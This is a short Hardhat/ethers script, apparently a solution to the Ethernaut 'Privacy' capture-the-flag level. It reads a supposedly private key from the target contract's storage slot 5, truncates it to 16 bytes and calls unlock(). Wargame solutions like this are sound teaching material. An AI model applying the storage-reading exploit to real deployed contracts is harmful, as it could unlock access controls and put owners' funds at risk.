import { ethers } from "hardhat";
import { Privacy__factory } from "../typechain/factories/contracts/Privacy__factory";


async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address = "0xDF527A73E513Bc96Ef748f58697d25cb3D7c3F0e";
    let privacy = new Privacy__factory(signer).attach(instance_address);
    console.log(await privacy.locked());


    let password = await provider.getStorageAt(instance_address, 5);
    password = password.substring(0, 2 + 16*2);
    console.log(password);
    let tx = await privacy.unlock(password);
    await tx.wait();
    console.log(await privacy.locked());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
